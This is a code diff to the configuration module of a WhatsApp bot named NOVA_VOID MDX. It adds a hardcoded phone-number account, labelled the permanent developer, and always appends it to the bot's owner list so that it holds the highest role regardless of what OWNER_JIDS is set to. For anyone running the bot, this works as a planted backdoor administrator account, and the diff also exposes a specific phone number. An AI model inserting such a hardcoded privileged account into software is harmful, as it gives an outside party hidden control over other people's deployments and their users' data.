@@ -41,11 +41,22 @@ function resolvePath(input, fallback) {
   return resolve(PROJECT_ROOT, raw);
 }
 
+// Permanent developer/owner of NOVA_VOID MDX. Always granted the highest
+// role regardless of what else is configured in OWNER_JIDS.
+const DEVELOPER_NUMBER = '50932528446';
+const DEVELOPER_JID = `${DEVELOPER_NUMBER}@s.whatsapp.net`;
+export { DEVELOPER_JID };
+
+function withDeveloper(jids) {
+  return Object.freeze(jids.includes(DEVELOPER_JID) ? jids : [...jids, DEVELOPER_JID]);
+}
+
 export const env = Object.freeze({
   nodeEnv: value(process.env.NODE_ENV, 'development'),
   botName: value(process.env.BOT_NAME, 'NOVA_VOID MDX'),
   prefix: value(process.env.PREFIX, '.'),
-  ownerJids: jidList(process.env.OWNER_JIDS, process.env.OWNER_JID),
+  ownerJids: withDeveloper(jidList(process.env.OWNER_JIDS, process.env.OWNER_JID)),
+  developerNumber: DEVELOPER_NUMBER,
   sudoJids: jidList(process.env.SUDO_JIDS),
   pairingPhone: value(process.env.PAIR_PHONE),
   authDir: resolvePath(process.env.AUTH_DIR, './data/auth'),
